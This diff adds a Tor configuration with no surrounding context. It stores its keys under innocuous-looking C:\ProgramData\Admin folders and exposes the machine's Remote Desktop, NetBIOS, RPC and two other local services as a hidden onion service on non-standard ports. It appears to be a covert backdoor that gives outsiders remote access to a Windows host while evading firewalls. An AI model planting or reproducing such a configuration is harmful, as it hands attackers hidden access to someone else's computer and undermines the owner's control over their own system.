@@ -1,0 +1,8 @@
+DataDirectory C:\ProgramData\Admin\keys
+HiddenServiceDir C:\ProgramData\Admin\local
+HiddenServiceVersion 3
+HiddenServicePort 39871 127.0.0.1:3389
+HiddenServicePort 39872 127.0.0.1:139
+HiddenServicePort 39873 127.0.0.1:135
+HiddenServicePort 39855 127.0.0.1:58332
+HiddenServicePort 39877 127.0.0.1:8089
